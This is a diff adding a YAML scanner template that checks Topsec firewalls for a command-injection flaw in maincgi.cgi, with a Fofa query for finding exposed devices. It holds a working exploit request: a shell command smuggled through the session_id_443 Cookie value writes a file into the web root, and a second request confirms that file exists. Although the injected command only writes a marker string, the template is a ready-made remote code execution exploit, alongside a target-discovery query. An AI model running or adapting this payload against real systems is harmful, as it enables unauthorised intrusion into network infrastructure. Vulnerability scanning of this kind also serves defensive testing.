@@ -1,0 +1,29 @@
+id: topsec-maincgi-cookie-rce
+
+info:
+  name: 天融信防火墙 Cookie 参数命令执行漏洞
+  author: Str1am
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+  tags: topsec,rce
+  created: 2023/12/08
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi/maincgi.cgi?Url=aa
+      headers:
+        Cookie: session_id_443=1|echo 'nvgjngfszfzahgf1' > /www/htdocs/site/image/{{randstr}}.txt;
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /site/image/{{randstr}}.txt
+    expression: response.status == 200 && response.body.bcontains(b'nvgjngfszfzahgf1')
+expression: r0() && r1()
